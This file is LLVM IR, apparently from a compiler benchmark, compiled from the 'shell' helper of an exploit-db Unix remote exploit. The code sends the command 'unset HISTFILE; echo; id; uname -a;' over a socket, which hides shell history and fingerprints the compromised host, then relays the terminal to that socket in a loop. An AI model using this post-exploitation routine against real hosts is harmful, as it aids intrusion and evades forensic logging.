; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21297.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21297.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shell.buff = internal global [1024 x i8] zeroinitializer, align 16
@__const.shell.INIT_CMD = private unnamed_addr constant [37 x i8] c"unset HISTFILE; echo; id; uname -a;\0A\00", align 16
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [32 x i8] c"[-] Error sending evil commands\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [11 x i8] c"[-] Select\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"[-] Read\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"[-] Write\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [37 x i8], align 16
  store i32 %0, i32* %2, align 4
  %6 = bitcast [37 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %6, i8* align 16 getelementptr inbounds ([37 x i8], [37 x i8]* @__const.shell.INIT_CMD, i32 0, i32 0), i64 37, i1 false)
  %7 = load i32, i32* %2, align 4
  %8 = getelementptr inbounds [37 x i8], [37 x i8]* %5, i64 0, i64 0
  %9 = getelementptr inbounds [37 x i8], [37 x i8]* %5, i64 0, i64 0
  %10 = call i32 @strlen(i8* %9)
  %11 = call i32 @write(i32 %7, i8* %8, i32 %10)
  %12 = getelementptr inbounds [37 x i8], [37 x i8]* %5, i64 0, i64 0
  %13 = call i32 @strlen(i8* %12)
  %14 = icmp slt i32 %11, %13
  br i1 %14, label %15, label %20

15:                                               ; preds = %1
  %16 = load i32, i32* @stderr, align 4
  %17 = call i32 @fprintf(i32 %16, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  %18 = load i32, i32* @EXIT_FAILURE, align 4
  %19 = call i32 @exit(i32 %18) #4
  unreachable

20:                                               ; preds = %1
  br label %21

21:                                               ; preds = %20, %69
  %22 = call i32 @FD_ZERO(i32* %4)
  %23 = call i32 @FD_SET(i32 0, i32* %4)
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @FD_SET(i32 %24, i32* %4)
  %26 = load i32, i32* %2, align 4
  %27 = add nsw i32 %26, 1
  %28 = call i32 @select(i32 %27, i32* %4, i32* null, i32* null, i32* null)
  %29 = icmp slt i32 %28, 1
  br i1 %29, label %30, label %34

30:                                               ; preds = %21
  %31 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %32 = load i32, i32* @EXIT_FAILURE, align 4
  %33 = call i32 @exit(i32 %32) #4
  unreachable

34:                                               ; preds = %21
  %35 = call i64 @FD_ISSET(i32 0, i32* %4)
  %36 = icmp ne i64 %35, 0
  br i1 %36, label %37, label %55

37:                                               ; preds = %34
  %38 = call i32 @read(i32 0, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 1024)
  store i32 %38, i32* %3, align 4
  %39 = icmp slt i32 %38, 1
  br i1 %39, label %40, label %44

40:                                               ; preds = %37
  %41 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  %42 = load i32, i32* @EXIT_FAILURE, align 4
  %43 = call i32 @exit(i32 %42) #4
  unreachable

44:                                               ; preds = %37
  %45 = load i32, i32* %2, align 4
  %46 = load i32, i32* %3, align 4
  %47 = call i32 @write(i32 %45, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 %46)
  %48 = load i32, i32* %3, align 4
  %49 = icmp ne i32 %47, %48
  br i1 %49, label %50, label %54

50:                                               ; preds = %44
  %51 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %52 = load i32, i32* @EXIT_FAILURE, align 4
  %53 = call i32 @exit(i32 %52) #4
  unreachable

54:                                               ; preds = %44
  br label %55

55:                                               ; preds = %54, %34
  %56 = load i32, i32* %2, align 4
  %57 = call i64 @FD_ISSET(i32 %56, i32* %4)
  %58 = icmp ne i64 %57, 0
  br i1 %58, label %59, label %69

59:                                               ; preds = %55
  %60 = load i32, i32* %2, align 4
  %61 = call i32 @read(i32 %60, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 1024)
  store i32 %61, i32* %3, align 4
  %62 = icmp slt i32 %61, 1
  br i1 %62, label %63, label %66

63:                                               ; preds = %59
  %64 = load i32, i32* @EXIT_SUCCESS, align 4
  %65 = call i32 @exit(i32 %64) #4
  unreachable

66:                                               ; preds = %59
  %67 = load i32, i32* %3, align 4
  %68 = call i32 @write(i32 1, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 %67)
  br label %69

69:                                               ; preds = %66, %55
  br label %21
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @fprintf(i32, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
